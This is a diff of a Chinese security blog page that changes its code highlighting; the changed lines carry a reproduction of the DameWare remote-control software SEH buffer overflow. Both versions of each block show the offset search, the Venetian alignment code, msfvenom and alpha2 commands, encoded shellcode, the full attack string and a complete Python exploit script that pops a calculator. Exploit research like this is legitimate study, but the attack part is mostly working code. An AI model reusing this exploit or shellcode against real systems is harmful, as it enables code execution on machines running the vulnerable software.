@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="0x01 漏洞描述DameWare是windows上一款著名的远控软件，其在2019年7月刚被曝出某处存在缓冲区溢出攻击，并可执行任意代码，影响版本V.12.1.0.34，这边做一下复现，环境是win 7(32位)。 0x02 漏洞分析根据作者POC，在Tools-&gt;Computer Comments-&gt;Description功能下的ComputerName文本框内输入超长字符串会导致">
@@ -106,7 +106,7 @@
   </style>
 </noscript>
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -340,11 +340,15 @@
 <p><img src="./3.png" alt=""></p>
 <p>按理说SEH应该会被覆写成0x41414141的，但这边确是0x00410041，根据经验，应该是程序把用户输入的ASCII转换成了UNICODE。</p>
 <p>为了能够编写exp，这边需要计算下用户输入的栈空间到SEH的偏移量，</p>
-<pre><code>msf-pattern_create -l 5000 #msf工具生成5000个字符</code></pre><p>输入ComputerName文本框后程序断下，单步后发现SEH被更改，堆栈跟随去观察具体覆盖情况</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l <span class="number">5000</span> #msf工具生成<span class="number">5000</span>个字符</span><br></pre></td></tr></table></figure>
+
+<p>输入ComputerName文本框后程序断下，单步后发现SEH被更改，堆栈跟随去观察具体覆盖情况</p>
 <p><img src="./10.png" alt=""></p>
 <p><img src="./11.png" alt=""></p>
 <p>查找偏移:</p>
-<pre><code>msf-pattern_offset -q &quot;37694136&quot; -l 5000</code></pre><p>发现偏移在260个字节处。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q <span class="string">"37694136"</span> -l <span class="number">5000</span></span><br></pre></td></tr></table></figure>
+
+<p>发现偏移在260个字节处。</p>
 <h2 id="0x03-漏洞脚本编写"><a href="#0x03-漏洞脚本编写" class="headerlink" title="0x03 漏洞脚本编写"></a>0x03 漏洞脚本编写</h2><p>确定是用户输入转unicode以及溢出偏移量以后就可以编写exp了，主要结构是padding + nseh + seh + shellcode</p>
 <p>利用原理如下：</p>
 <ul>
@@ -355,38 +359,28 @@
 <p>首先在 Immunity debugger 下用mona插件找一个合适的<code>POP-POP-RET</code>地址</p>
 <p><img src="./12.png" alt=""></p>
 <p>由于程序会将用户输入的ascii转为unicode，这边无法找到合适的输入转化为unicode来构造jmp short跳转到shellcode，所以这边使用一种叫做ventian shellcode来进行填充，将shellcode的内存地址放到eax寄存器中，然后push eax到栈上，最后ret eax到eip，通过这种方式去执行shellcode代码。</p>
-<pre><code>junk1 = &quot;A&quot; * 260
-nseh  = &quot;\x61\x43&quot; #popad
-# 0x007a0021 : pop esi # pop edi # ret
-seh   = &quot;\x21\x7a&quot; #unicode将转换为0x007a0021
-junk2 = &quot;\x41&quot; * 1348 
-# 将真正的shellcode放在eax中，之后压栈，最后ret(eax)
-# 20 bytes
-align  = &quot;&quot;
-align += &quot;\x43&quot; * 10                # Padding
-align += &quot;\x58&quot;                     # POP EAX
-align += &quot;\x73&quot;                     # Venetian padding
-# 0012F590   83C0 50                # ADD EAX,50
-align += u&quot;\uC083&quot; + &quot;\x50&quot;         # ADD EAX, 50
-align += &quot;\x73&quot;                     # Venetian padding
-align += &quot;\x50&quot;                     # PUSH EAX
-align += &quot;\x73&quot;                     # Venetian padding
-align +=  u&#39;\uC3C3&#39;                 # RETN</code></pre><p>简单来说其实就是找一个接近布置shellcode的缓冲区地址的寄存器，并通过增加/减小它的值来使它指向shellcode，最终通过push reg，ret的方式来跳转到shellcode执行，这边最初的eax距shellcode 50字节的大小，所以需要构造来add eax 50。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">junk1 = <span class="string">"A"</span> * 260</span><br><span class="line">nseh  = <span class="string">"\x61\x43"</span> #popad</span><br><span class="line"><span class="comment"># 0x007a0021 : pop esi # pop edi # ret</span></span><br><span class="line">seh   = <span class="string">"\x21\x7a"</span> #unicode将转换为0x007a0021</span><br><span class="line">junk2 = <span class="string">"\x41"</span> * 1348 </span><br><span class="line"><span class="comment"># 将真正的shellcode放在eax中，之后压栈，最后ret(eax)</span></span><br><span class="line"><span class="comment"># 20 bytes</span></span><br><span class="line">align  = <span class="string">""</span></span><br><span class="line">align += <span class="string">"\x43"</span> * 10                # Padding</span><br><span class="line">align += <span class="string">"\x58"</span>                     # POP EAX</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line"><span class="comment"># 0012F590   83C0 50                # ADD EAX,50</span></span><br><span class="line">align += u<span class="string">"\uC083"</span> + <span class="string">"\x50"</span>         # <span class="builtin-name">ADD</span> EAX, 50</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align += <span class="string">"\x50"</span>                     # PUSH EAX</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align +=  u<span class="string">'\uC3C3'</span>                 # RETN</span><br></pre></td></tr></table></figure>
+
+
+
+<p>简单来说其实就是找一个接近布置shellcode的缓冲区地址的寄存器，并通过增加/减小它的值来使它指向shellcode，最终通过push reg，ret的方式来跳转到shellcode执行，这边最初的eax距shellcode 50字节的大小，所以需要构造来add eax 50。</p>
 <p>之后生成shellcode，这边选用msf来生成，并用一个叫alpha2的工具来将ascii编码的shellcode转为unicode后仍可用的字符串</p>
-<pre><code>msfvenom -p windows/exec CMD=calc -f raw &gt; shellcode.raw
-./alpha2 eax --unicode --uppercase &lt; shellcode.raw
-##alpha2生成的shellcode是变化的，生成的shellcode无法成功执行时可以多换几个shellcode试试</code></pre><p>这边alpha2不自带，需要自己编译，贴下源码地址 <a href="https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/alpha2.c" target="_blank" rel="noopener">https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/alpha2.c</a> </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec <span class="attribute">CMD</span>=calc -f<span class="built_in"> raw </span>&gt; shellcode.raw</span><br><span class="line">./alpha2 eax --unicode --uppercase &lt; shellcode.raw</span><br><span class="line"><span class="comment">##alpha2生成的shellcode是变化的，生成的shellcode无法成功执行时可以多换几个shellcode试试</span></span><br></pre></td></tr></table></figure>
+
+<p>这边alpha2不自带，需要自己编译，贴下源码地址 <a href="https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/alpha2.c" target="_blank" rel="noopener">https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/alpha2.c</a> </p>
 <p>生成shellcode如下:</p>
-<pre><code>shellcode=&quot;PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A&quot;</code></pre><h2 id="0x04-攻击演示"><a href="#0x04-攻击演示" class="headerlink" title="0x04 攻击演示"></a>0x04 攻击演示</h2><p>将shellcode代入之前编写好的padding+nseh+seh+shellcode+padding的模板，得到攻击代码如下:</p>
-<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaC!zCCCCCCCCCCXs삃PsPs쏃CCCCCCCCCCCCCCCCCCPPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0ADDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</code></pre><p>提前在<code>0x007a0021</code>处下好断点，进行输入后发现断在了<code>0x007a0021</code>处，单步</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">shellcode</span>=<span class="string">"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-攻击演示"><a href="#0x04-攻击演示" class="headerlink" title="0x04 攻击演示"></a>0x04 攻击演示</h2><p>将shellcode代入之前编写好的padding+nseh+seh+shellcode+padding的模板，得到攻击代码如下:</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaC!zCCCCCCCCCCXs삃PsPs쏃CCCCCCCCCCCCCCCCCCPPYAIAIAIAIAQATAXAZAPA<span class="number">3</span>QADAZABARALAYAIAQAIAQAPA<span class="number">5</span>AAAPAZ<span class="number">1</span>AI<span class="number">1</span>AIAIAJ<span class="number">11</span>AIAIAXA<span class="number">58</span>AAPAZABABQI<span class="number">1</span>AIQIAIQI<span class="number">1111</span>AIAJQI<span class="number">1</span>AYAZBABABABAB<span class="number">30</span>APB<span class="number">944</span>JBKLIXTBKPKP<span class="name">M0</span>C<span class="number">03</span>YK<span class="number">5</span>P<span class="number">1</span>Y<span class="number">01</span>T<span class="number">4</span>KR<span class="number">0004</span>K<span class="number">22</span>LLTKPRMDTKD<span class="number">2</span><span class="symbol">NHLO87</span>PJ<span class="meta">O601</span>KOFLOLQQCL<span class="name">M2</span><span class="symbol">NLMPWQXOLMKQWWK2</span>ZRR<span class="number">2</span>PWTKB<span class="number">2</span>LPDKPJOLDKPL<span class="symbol">N1</span>RXISOXKQXQPQTKPYMPKQXSTK<span class="number">19</span>LX<span class="number">9</span>S<span class="symbol">NZPITKOD4</span>KKQYF<span class="symbol">NQKOVLY1</span>XOLM<span class="name">M1</span>WWOH<span class="number">9</span>P<span class="number">45</span>JVKSSMJXOKSM<span class="meta">O43</span>EK<span class="number">4</span>PX<span class="number">4</span>KR<span class="number">8</span>MT<span class="name">M1</span>YC<span class="number">1</span>V<span class="number">4</span>KLL<span class="number">0</span>K<span class="number">4</span>K<span class="number">28</span>MLKQ<span class="number">8</span>STKKT<span class="number">4</span>KKQJ<span class="number">0</span>SYOTMT<span class="meta">O41</span>K<span class="number">1</span>KQQR<span class="number">9</span>PZPQKOIP<span class="number">1</span><span class="meta">O1</span>OPZTK<span class="symbol">N2</span>ZKTMQMBJ<span class="name">M1</span>TME<span class="number">5</span>X<span class="number">2</span>KPKP<span class="name">M0</span>PPQX<span class="symbol">NQTKROSWKOXUGKJP85</span><span class="name">G2</span>PVQX<span class="number">5</span>VV<span class="number">57</span>MUMK<span class="meta">O9</span>EOLK<span class="attr">VSLKZU0</span>KKYPT<span class="number">5</span>KUWKOWMCRRR<span class="meta">O2</span>JKP<span class="number">0</span>SK<span class="meta">O8</span>US<span class="number">31</span>QRLS<span class="number">3</span><span class="name">M0</span>ADDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br></pre></td></tr></table></figure>
+
+<p>提前在<code>0x007a0021</code>处下好断点，进行输入后发现断在了<code>0x007a0021</code>处，单步</p>
 <p><img src="./4.png" alt=""></p>
 <p>ret返回到nseh指向的缓冲代码处</p>
 <p><img src="./5.png" alt=""></p>
-<pre><code>add eax 0x50
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add</span> <span class="built_in">eax</span> <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
 
-push eax
-
-ret</code></pre><p><img src="./6.png" alt=""></p>
+<p><img src="./6.png" alt=""></p>
 <p>最后ret到真正的shellcode处</p>
 <p><img src="./7.png" alt=""></p>
 <p>执行shellcode，创建calc进程</p>
@@ -395,24 +389,9 @@ ret</code></pre><p><img src="./6.png" alt=""></p>
 <p>这边作者只是在最后的padding后加了两字节unicode就能弹计算器了，神奇，哎，我太难了。</p>
 <p>PWN！！！</p>
 <p><img src="./9.png" alt=""></p>
-<h2 id="0x05-完整脚本"><a href="#0x05-完整脚本" class="headerlink" title="0x05 完整脚本"></a>0x05 完整脚本</h2><pre><code>#!/usr/bin/env python
-junk1 = &quot;\x41&quot; * 260
-nseh  = &quot;\x61\x43&quot;
-seh   = &quot;\x21\x7a&quot;
-align  = &quot;&quot;
-align += &quot;\x43&quot; * 10                # Padding
-align += &quot;\x58&quot;                     # POP EAX
-align += &quot;\x73&quot;                     # Venetian padding
-align += u&quot;\uC083&quot; + &quot;\x50&quot;         # ADD EAX, 50
-align += &quot;\x73&quot;                     # Venetian padding
-align += &quot;\x50&quot;                     # PUSH EAX
-align += &quot;\x73&quot;                     # Venetian padding
-align +=  u&#39;\uC3C3&#39;                 # RETN
-junk2 = &quot;\x43&quot; * 18
-junk3 = &quot;\x44&quot; * 550 + u&quot;\uD066&quot; + u&quot;\u7FFD&quot; # u&quot;\xF0FF&quot;
-shellcode = &quot;PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A&quot;
-crash = junk1 + nseh + seh + align + junk2 + shellcode + junk3
-print(crash)</code></pre><p>贴下漏洞信息 <a href="https://www.exploit-db.com/exploits/47444" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47444</a> </p>
+<h2 id="0x05-完整脚本"><a href="#0x05-完整脚本" class="headerlink" title="0x05 完整脚本"></a>0x05 完整脚本</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">junk1 = <span class="string">"\x41"</span> * 260</span><br><span class="line">nseh  = <span class="string">"\x61\x43"</span></span><br><span class="line">seh   = <span class="string">"\x21\x7a"</span></span><br><span class="line">align  = <span class="string">""</span></span><br><span class="line">align += <span class="string">"\x43"</span> * 10                # Padding</span><br><span class="line">align += <span class="string">"\x58"</span>                     # POP EAX</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align += u<span class="string">"\uC083"</span> + <span class="string">"\x50"</span>         # <span class="builtin-name">ADD</span> EAX, 50</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align += <span class="string">"\x50"</span>                     # PUSH EAX</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align +=  u<span class="string">'\uC3C3'</span>                 # RETN</span><br><span class="line">junk2 = <span class="string">"\x43"</span> * 18</span><br><span class="line">junk3 = <span class="string">"\x44"</span> * 550 + u<span class="string">"\uD066"</span> + u<span class="string">"\u7FFD"</span> # u<span class="string">"\xF0FF"</span></span><br><span class="line">shellcode = <span class="string">"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A"</span></span><br><span class="line">crash = junk1 + nseh + seh +<span class="built_in"> align </span>+ junk2 + shellcode + junk3</span><br><span class="line"><span class="builtin-name">print</span>(crash)</span><br></pre></td></tr></table></figure>
+
+<p>贴下漏洞信息 <a href="https://www.exploit-db.com/exploits/47444" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47444</a> </p>
 
     </div>
 
@@ -518,8 +497,6 @@ print(crash)</code></pre><p>贴下漏洞信息 <a href="https://www.exploit-db.c
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
